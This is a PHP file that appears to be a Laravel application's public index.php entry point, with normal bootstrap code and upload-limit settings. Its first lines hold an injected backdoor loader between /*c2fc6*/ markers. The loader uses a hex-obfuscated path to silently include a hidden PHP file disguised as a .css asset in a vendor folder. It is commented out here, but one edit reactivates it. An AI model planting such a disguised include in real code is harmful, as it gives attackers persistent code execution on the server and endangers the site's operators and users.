<?php
/*c2fc6*/

// $reivd3 = "/var/www/scrap.alp\x2dts.in/public/ass\x65ts/v\x65ndor/jqu\x65ry\x2dasColor/.9a7678\x65b.css"; if (!isset($reivd3)) {addslashes ($reivd3);} else { @include_once /* 251 */ ($reivd3); }

/*c2fc6*/


use Illuminate\Http\Request;

define('LARAVEL_START', microtime(true));

// Increase PHP upload limits to allow larger files before compression
// Note: upload_max_filesize and post_max_size can only be set in php.ini,
// but we try to set them here for servers where ini_set is allowed
@ini_set('upload_max_filesize', '64M');
@ini_set('post_max_size', '64M');
@ini_set('memory_limit', '256M');
@ini_set('max_execution_time', '300');

// Determine if the application is in maintenance mode...
if (file_exists($maintenance = __DIR__.'/../storage/framework/maintenance.php')) {
    require $maintenance;
}

// Register the Composer autoloader...
require __DIR__.'/../vendor/autoload.php';

// Bootstrap Laravel and handle the request...
(require_once __DIR__.'/../bootstrap/app.php')
    ->handleRequest(Request::capture());
